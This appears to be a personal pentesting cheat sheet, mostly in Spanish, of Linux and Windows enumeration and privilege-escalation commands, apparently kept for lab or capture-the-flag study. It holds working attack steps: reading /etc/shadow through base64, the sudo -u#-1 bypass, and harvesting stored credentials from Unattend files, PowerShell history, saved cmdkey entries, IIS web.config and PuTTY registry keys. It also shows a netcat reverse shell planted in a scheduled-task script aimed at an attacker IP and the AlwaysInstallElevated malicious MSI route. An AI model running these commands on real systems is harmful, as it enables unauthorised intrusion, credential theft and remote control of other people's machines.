
Windows -> https://lolbas-project.github.io/
Linux -> https://gtfobins.org/

https://book.hacktricks.wiki/es/index.html

env -> muestra variables de entorno
uname -a -> version kernel
/proc/version -> informacion del procesos de sistema
/etc/issue -> informacion del procesos de sistema
cat /etc/passwd | cut -d ":" -f 1 -> listado de usuarios del sistema
find . -name flag.txt -> buscar archivo en directorio actual
find / -type f -user cage 2>/dev/null -> buscar archivos con permiso por usuario 
whoami /priv -> privilegios en windows (escalado SeImpersonatePrivilege enable)

use auxiliary/scanner/ssh/ssh_login -> sesion msfconsole teniendo credenciales

ss -tulpn -> listar puertos abiertos de servidor
Argument	Description
-t	Display TCP sockets
-u	Display UDP sockets
-l	Displays only listening sockets
-p	Shows the process using the socket
-n	Doesn't resolve service names

/usr/share/nmap/nselib/data/wp-plugins.lst -> diccionario de plugins de wordpress wp

netsh firewall show state -> comando de windows para saber estado del firewall
netsh advfirewall show allprofiles -> version actualizada para ver reglas configuradas
# *Escalamiento Linux*
find / -perm -u=s -type f 2>/dev/null -> busca archivos con permisos especiales
find / -type f -perm -04000 -ls 2>/dev/null -> simil

getcap -r / 2>/dev/null -> lista procesos con capabilities 

sudo -l (L) -> lista comandos que se pueden usar como root

hacks ver archivo de contraseñas
base64 /etc/shadow | base64 -d

sudo --version -> version de sudo
sudo -u#-1 /bin/bash -> vulnerabilidad de sudo antes de 1.8.28 // (ALL, !root) /bin/bash

# *Escalamiento Windows*
Ante instalación masiva de windows, pueden quedar credenciales en estas rutas
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml

History de powershell (DEBE USARSE DESDE CMD.exe)
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

**Listar credenciales guardadas**
cmdkey  /list
runas /savecred /user:admin cmd.exe (se cambia usr en base a comando anterior)

**IIS**
rutas:
    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
Comando con filtrado:
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

**putty**
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

**servicios corriendo**
schtasks
ej: 
 - schtasks /query /tn vulntask /fo list /v -> info varia
 - icacls c:\tasks\schtask.bat - > veo permisos que usa
 - echo c:\tools\nc64.exe -e cmd.exe att_ip 4444 > c:\tasks\schtask.bat -> shell
 - schtasks /run /tn vulntask -> ejecuto para iniciar shell reversa

**mediante instalación de paquete msi**
deben haber 2 registros seteados y luego generar una reverse shell mediante msfvenom, dejarla en la maquina atacada y ejecutar el script
valores de registros
 C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
 C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
ejecucion
 C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

Herramientas
- WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths.
- PrivescCheck is a PowerShell script that searches common privilege escalation on the target system
- If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester`


